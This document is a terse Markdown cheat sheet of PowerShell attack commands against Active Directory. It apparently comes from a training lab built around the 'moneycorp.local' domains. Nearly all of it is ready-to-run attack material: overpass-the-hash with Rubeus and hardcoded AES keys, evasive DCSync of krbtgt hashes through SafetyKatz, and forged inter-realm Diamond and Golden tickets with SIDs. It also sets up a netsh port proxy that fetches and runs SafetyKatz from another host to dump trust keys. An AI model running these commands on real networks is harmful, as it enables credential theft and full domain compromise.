#### OPtH + Obtain krbtgt hash
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

Obtain Domain Controllers SID of parent domain for interrealm Diamond ticket
```powershell
Get-DomainGroup -Identity "Domain Controllers" -domain moneycorp.local
```

Forge interrealm Diamond ticket using the DC identity 
> **Note:** `/sids` = (Domain Controllers SID), (Enterprise Domain Controllers -  S-1-5-9 )
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run DCsync on parent domain
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Forge golden ticket to access parent domain DC
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /sid:S-1-5-21-335606122-960912869-3279953914 /ldap /user:Administrator /domain:moneycorp.local /printcmd
```

Run displayed command and add `/ptt`
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:90EC02CC0396DE7E08C7D5A163C21FD59FCB9F8163254F9775FC2604B9AEDB5E /user:Administrator /id:500 /pgid:513 /domain:moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /pwdlastset:"11/11/2022 6:34:22 AM" /logoncount:550 /netbios:mcorp /groups:544,512,520,513 /dc:MCORP-DC.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

> **Note:** Can only access resources that were explicitly shared with you

Across external trusts - OPtH and obtain trust key
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe

winrs -r:dcorp-dc 

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```


